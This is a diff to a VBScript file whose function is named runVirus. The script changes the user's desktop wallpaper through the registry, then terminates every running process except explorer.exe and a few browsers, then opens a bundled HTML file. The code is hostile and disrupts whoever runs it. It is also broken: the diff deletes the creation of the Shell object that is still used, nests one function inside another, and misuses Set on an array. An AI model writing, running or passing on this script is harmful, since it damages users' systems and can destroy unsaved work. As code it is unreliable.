@@ -2,6 +2,9 @@ Option Explicit
 
 Dim wallpaperPath, htmlFilePath, Shell, answer
 
+Dim excludedProcesses
+
+Set excludedProcesses = Array("explorer.exe", "chrome.exe", "firefox.exe", "iexplore.exe")
 
 Dim objWMIService, colProcesses, objProcess
 
@@ -23,18 +26,26 @@ Function runVirus()
     scriptDir = Left(WScript.ScriptFullName, InStrRev(WScript.ScriptFullName, "\"))
     wallpaperPath = scriptDir & "Wallpaper.jpg"
     htmlFilePath = scriptDir & "File.html"
-    
-    Set Shell = CreateObject("WScript.Shell")
 
     Shell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", wallpaperPath
     Shell.Run "RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True
 
-    For Each objProcess in colProcesses
-    ' Check if the process name is not "cmd.exe"
-    If Not LCase(objProcess.Name) = "chronos.vbs" Then
+For Each objProcess in colProcesses
+    If Not IsInArray(objProcess.Name, excludedProcesses) And Not LCase(objProcess.Name) = "explorer.exe" Then
         objProcess.Terminate
     End If
 Next
+
+Function IsInArray(item, arr)
+    Dim i
+    For i = 0 To UBound(arr)
+        If LCase(arr(i)) = LCase(item) Then
+            IsInArray = True
+            Exit Function
+        End If
+    Next
+    IsInArray = False
+End Function
 
     
     Shell.Run """" & htmlFilePath & """", 1, False
